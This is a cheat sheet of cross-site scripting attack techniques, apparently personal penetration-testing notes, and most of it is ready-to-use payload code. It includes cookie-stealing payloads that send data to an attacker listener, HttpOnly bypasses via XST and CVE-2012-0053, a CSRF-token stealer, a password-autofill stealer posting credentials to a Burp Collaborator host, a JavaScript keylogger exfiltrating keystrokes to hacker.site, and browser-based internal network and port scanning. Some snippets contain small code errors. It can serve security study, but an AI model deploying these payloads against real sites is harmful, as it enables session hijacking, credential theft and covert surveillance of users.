# ------------------------------- start introduction ------------------------------- # 
    - Attacks:
        - XSS steal cookie
            - Bypassing HTTPonly flag
            - CVE-2012-0053
            - Tunneling BeEF proxy
        - Defacement
        - Client exploitation
        - keylogger
        
        - Network Attacks
            - IP Detection
            - Subnet Discovery
            - Ping sweep
            - Port scanning

        - Browser Bookmark

# -------------------------------   end introduction ------------------------------- # 


# ------------------------------- start XSS steal cookie ------------------------------- # 
    # ---------- |XSS steal cookie| ---------- #
        ==> attack scenario:
            1st: create lisnter for the request and get it ready for Harvesting/parsing the request.
            2nd: send cookie to your lisnter by JS.
                <img src=x onerror="this.src='http://192.168.0.18:8888/?c='+document.cookie;">
                    ==> explanation: with infinity loop.
                <img src=x onerror="this.src='http://192.168.0.18:8888/?c='+document.cookie; this.removeAttribute('onerror');">
                    ==> explanation: without infinity loop.


    # ---------- |Xypassing HTTPonly flag| ---------- #
        ==> Quick view: HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when 
                        generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it).
        
                        Technique is called XST (Cross-Site Tracing). we have an ability to steal cookie that secured by HTTPonly flag.
                        Idea of the attack is the trace method makes the server respond with HTTP header content within HTTP response.

        ==> Attack scenario:
            1st: Inject Ajax to create HTTP request contains credentials (Cookie) that will send by browser to the server.
                <script>
                    var xmlhttp = new XMLHttpRequest();
                    var url     = 'http://victim.site/';
                    xmlhttp.withCredentials = true;         // send cookie header
                    xmlhttp.open('trace',url);              // send the request

                    // print cookies value within console after change http state value of xmlhttp
                    function hand () {
                        console.log(this.getAllResponseHeaders());
                    }
                    xml.onreadystatechange = hand;
                </script>

        ==> V.I Note: this technique is very old and modern browsers have blocked HTTP TRACE method in XMLHttpRequest

    # ---------- |CVE-2012-0053| ---------- #
        ==> Quick view: protocol.c in the Apache HTTP Server 2.2.x through 2.2.21 does not properly restrict header information 
                        during construction of Bad Request (aka 400) error documents, which allows remote attackers to obtain 
                        the values of HTTPOnly cookies via vectors involving a (1) long or (2) malformed header in conjunction 
                        with crafted web script.
                        
        ==> Attack scenario:
            1st: POC to inject:
                // Most browsers limit cookies to 4k characters, so we need multiple
                function setCookies (good) {
                    // Construct string for cookie value
                    var str = "";
                    for (var i=0; i< 819; i++) {
                        str += "x";
                    }
                    // Set cookies
                    for (i = 0; i < 10; i++) {
                        // Expire evil cookie
                        if (good) {
                            var cookie = "xss"+i+"=;expires="+new Date(+new Date()-1).toUTCString()+"; path=/;";
                        }
                        // Set evil cookie
                        else {
                            var cookie = "xss"+i+"="+str+";path=/";
                        }
                        document.cookie = cookie;
                    }
                }

                function makeRequest() {
                    setCookies();

                    function parseCookies () {
                        var cookie_dict = {};
                        // Only react on 400 status
                        if (xhr.readyState === 4 && xhr.status === 400) {
                            // Replace newlines and match <pre> content
                            var content = xhr.responseText.replace(/\r|\n/g,'').match(/<pre>(.+)<\/pre>/);
                            if (content.length) {
                                // Remove Cookie: prefix
                                content = content[1].replace("Cookie: ", "");
                                var cookies = content.replace(/xss\d=x+;?/g, '').split(/;/g);
                                // Add cookies to object
                                for (var i=0; i<cookies.length; i++) {
                                    var s_c = cookies[i].split('=',2);
                                    cookie_dict[s_c[0]] = s_c[1];
                                }
                            }
                            // Unset malicious cookies
                            setCookies(true);
                            alert(JSON.stringify(cookie_dict));
                        }
                    }
                    // Make XHR request
                    var xhr = new XMLHttpRequest();
                    xhr.onreadystatechange = parseCookies;
                    xhr.open("GET", "/", true);
                    xhr.send(null);
                }

                makeRequest();
        ==> V.I Note: BeEf has apache cookie disclosure within XSS exploitation category.

    # ---------- |Tunneling BeEF proxy| ---------- #
        ==> Quick view: what we can do here is exploit the XSS flaw and use the victim browser to perform 
                        requests as the victim user to the web applicaiton.

        ==> Attack scenario:
            1st: hook the user's browser by BeEF.
            2nd: establish BeEF proxy tunneling to redirect any request to preform on behalf of the user's browser.

        ==> V.I Note: this technique is effective against web developer protoection techniques like user-Agent, IP, Custom headers, etc. 
# -------------------------------   end XSS steal cookie ------------------------------- # 

# ------------------------------- start CSRF via XSS ------------------------------- # 
<script>
        var csrf_token;
        function csrfstealer(){
            var xhttp;
            if (window.XMLHttpRequest) {
                xhttp   = new XMLHttpRequest();
            } else {
                xhttp   = ActiveXObject('Microsoft.XMLHTTP');
            }
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var entire_content = xhttp.response;
                    var form = entire_content.match(/value="[A-Za-z0-9]{32}">/g);
                    csrf_token_arr =  form[0].match(/[A-Za-z0-9]{32}/g);
                    csrf_token = csrf_token_arr[0];
                    
                }
            }
        xhttp.onload = doit;
        xhttp.open("GET",window.location.href, true);
        xhttp.send();
        function doit(){
            var xhttp;
            if (window.XMLHttpRequest) {
                xhttp   = new XMLHttpRequest();
            } else {
                xhttp   = ActiveXObject('Microsoft.XMLHTTP');
            }
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                        console.log("Email update end-point has been reached...");
                }
            }
            xhttp.open("POST","/my-account/change-email", true);
            xhttp.send("email=test@test.com&csrf="+csrf_token);
        };
    };
    csrfstealer();
</script>
# -------------------------------   end CSRF via XSS ------------------------------- # 


# ------------------------------- start XSS steal password manager auto fill - no cors ------------------------------- #
<form class="login-form" method="POST" action="/">                       
                            <label>Username</label>
                            <input required="" type="username" id="user" name="username" onchange="UserFunction()">
                            <label>Password</label>
                            <input required="" type="password" id="pass" name="password" onchange="passFunction()"> 
                        </form>
<script>
    function UserFunction(){
        fetch('https://8t2cisavzb9sgu8ew86irjqqlhr7fw.burpcollaborator.net/user',{
        method:'POST',
        mode: 'no-cors',
        body:document.getElementById("user").value
        });      
    }
    function passFunction(){
        fetch('https://8t2cisavzb9sgu8ew86irjqqlhr7fw.burpcollaborator.net/pass',{
        method:'POST',
        mode: 'no-cors',
        body:document.getElementById("pass").value
        });      
    }
</script>
# -------------------------------   end XSS steal password manager auto fill - no cors ------------------------------- #


# ------------------------------- start XSS steal cookie from different path ------------------------------- # 
    ==> Quick view: web browser enforces the same-origin policy on protocol-hostname-port.
                    the cookie path has nothing to do with security. we still have access the DOM.
    
    ==> attack scenario:
        ==> QuickView: it is possible in path2 to read cookie in path1.
            1st: payload in path2
                <script>
                    function cookiepath(path) {
                        for (var i = 0; i < window.frames.length;i++) {
                            frameURL = window.frames[i].location.toString();
                            if (frameURL.indexof(path) > -1) {
                                alert(window.frames.[i].document.cookie);
                            }
                        }
                    }
                </script>
                <iframe onload="cookiepath('/path1/')" style="display:none;" src="/path1/index.php"></iframe>

            ==> V.I Note: payload could be written in JS code and JS within the target injectable point.
# -------------------------------   end XSS steal cookie from different path ------------------------------- # 

# ------------------------------- start Defacement ------------------------------- # 
    document.forms[0].action="https://hacker.site/steal.php";
# -------------------------------   end Defacement ------------------------------- # 

# ------------------------------- start Client exploitation ------------------------------- # 
    ==> Quick View: once an XSS vulnerability is found, exploit it and gain control of the remote browser.

    # ---------- |Tools| ---------- #
        - BeEF
        - metasploit: autopwn

    # ---------- |BeEF| ---------- #
        ==> Quick View: BeEf is the fastest way to exploit it and gain control.
                        if the browser is unpatched or old, BeEf and metasploit autopwn are capable of exploiting 
                        it to give you remote shell on the remote machine.
# -------------------------------   end Client exploitation ------------------------------- # 

# ------------------------------- start keylogger ------------------------------- # 
    ==> Quick view: it's very helpful to know what our victim is typing during their activity on a targeted website.
    
    ==> Attack scenario:
        1st: JS keylogger injection
            var keys = ""; // WHERE > where to store the key strokes
            document.onkeypress = function(e) {
                var get = window.event ? event : e;
                var key = get.keyCode ? get.keyCode : get.charCode;
                key = String.fromCharCode(key);
                keys += key;
            }
            window.setInterval(function(){
                if(keys !== ""){
                    // HOW > sends the key strokes via GET using an Image element to listening hacker.site server
                    var path = encodeURI("http://hacker.site/keylogger?k=" + keys);
                    new Image().src = path;
                    keys = "";
                }
            }, 1000); // WHEN > sends the key strokes every second

    # ---------- |Tools| ---------- #
        - metasploit: http_javascript_keylogger
        - BeEF: Event Logger
# -------------------------------   end keylogger ------------------------------- #

# ------------------------------- start Network Attacks ------------------------------- #
    # ---------- |IP Detection| ---------- #
    
    # ---------- |Subnet Discovery| ---------- #
        ==> Quick view: Attack to discover internal subnet through XMLHttpRequest cross-origin requests basically, uses the response times as a covert
                        channel to infer wether an internal host is up or down.

        ==> Attack scenario:
            1st : find xss vuleranbility.
            2nd: inject the code below that loop on most common router IPs [2,200,254]
                var ranges = [
                '192.168.0.0','192.168.1.0',
                '192.168.2.0','192.168.10.0',
                '192.168.100.0','192.168.123.0',
                '10.0.0.0','10.0.1.0',
                '10.1.1.0'
                ];
                var discovered_hosts = [];
                // XHR timeout
                var timeout = 5000;

                function doRequest(host) {
                var d = new Date;
                var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = processRequest;
                xhr.timeout = timeout;

                function processRequest(){
                if(xhr.readyState == 4){
                var time = new Date().getTime() - d.getTime();
                var aborted = false;
                // if we call window.stop() the event triggered is 'abort'
                // http://www.w3.org/TR/XMLHttpRequest/#event-handlers
                xhr.onabort = function(){
                    aborted = true;
                }

                xhr.onloadend = function(){
                    if(time < timeout){
                    // 'abort' fires always before 'onloadend'
                    if(time > 10 && aborted === false){ 
                        // console.log('Discovered host ['+host+'] in ['+time+'] ms');
                        discovered_hosts.push(host);
                    }
                    }
                    }
                }
                }

                xhr.open("GET", "http://" + host, true);
                xhr.send();
                }

                var start_time = new Date().getTime();
                function checkComplete(){
                    var current_time = new Date().getTime();
                    if((current_time - start_time) > timeout + 1000){
                        // to stop pending XHRs, especially in Chrome
                        window.stop(); 
                        clearInterval(checkCompleteInterval);
                        // console.log("Discovered hosts:\n" +  discovered_hosts.join("\n"));               // print discovered_hosts
                        document.cookie = 'host_disc' + "=" + discovered_hosts.join("|")+ ";" + ";path=/";  // store discovered_hosts within host_disc cookie
                    }
                }

                var checkCompleteInterval = setInterval(function(){
                checkComplete()}, 1000);

                for (var i = 0; i < ranges.length; i++) {
                // the following returns like 192.168.0.
                var c = ranges[i].split('.')[0]+'.'+
                ranges[i].split('.')[1]+'.'+
                ranges[i].split('.')[2]+'.';
                // for every entry in the 'ranges' array, request
                // the most common gateway IPs, like:
                // 192.168.0.1, 192.168.0.100, 192.168.0.254
                doRequest(c + '1');
                doRequest(c + '6');
                doRequest(c + '254');
                }
        
    # ---------- |Ping sweep| ---------- #
        # ---------- |Through Java Applet| ---------- #
            ==> V.I Note: deprecated attack method and requires uesr's interaction for example (decrease browser security level, enable java, allow java applet app).

        # ---------- |Through XMLHttpRequest| ---------- #
            ==> Quick view: using XMLHttpRequest cross-origin to discover host up and down.
            
            ==> Attack scenario:
                Same attack scenario for subnet discover with change IP list.

    # ---------- |Port scanning| ---------- #

        # ---------- |Image DOM Element| ---------- #
            ==> Quick view: Uses the <img> tag and DOM events to detect whether a port on a specific host is opened or closed.
                            technique is setting the src of the image on specific port in order to let the broswer know to perform
                            a TCP conenction to the identified port and then analyze the event of the response.

            ==> Attack scenario:
                1st: POC (Need to re-build a method to automate the attack by JS)
                    var img = new Image();
                    img.src = 'http://<ip or domain>' + ':' + '<port>' + '/secranix.png';

                ==> V.I Note: Modern browser has banned the known ports list whichs return error code: ERR_UNSAFE_PORT

        # ---------- |WebSocket| ---------- #
            1st: POC (Need to re-build a method to automate the attack by JS)
                function test(port) {
                    try {
                        var start = performance.now();
                        var socket = new WebSocket('ws://localhost:' + port);

                        socket.onerror = function (event) {
                        console.log('error', performance.now() - start, event);
                        }

                        socket.addEventListener('close', function(event) {
                        console.log('close', performance.now() - start, event);
                        })

                        socket.addEventListener('open', function (event) {
                        console.log('open', performance.now() - start, event);
                        socket.send('Hello Server!');
                        });

                        socket.addEventListener('message', function (event) {
                            console.log('message ', performance.now() - start, event);
                        });
                    } catch(ex) {
                        console.log(ex) 
                    }
                    }

            ==> V.I Note: Modern browser has banned the known ports list whichs return error code: ERR_UNSAFE_PORT
# -------------------------------   end Network Attacks ------------------------------- #

# ------------------------------- start Browser Bookmark ------------------------------- #
    ==> Quick view: running javascript within bookmark location to bypass CORS and read any tab open while execution.

    ==> Attack scenario:
        1st: bookmark with location equal to
             javascript:alert(document.cookie);
        2nd: run the bookmark while you open any domain.
# -------------------------------   end Browser Bookmark ------------------------------- #


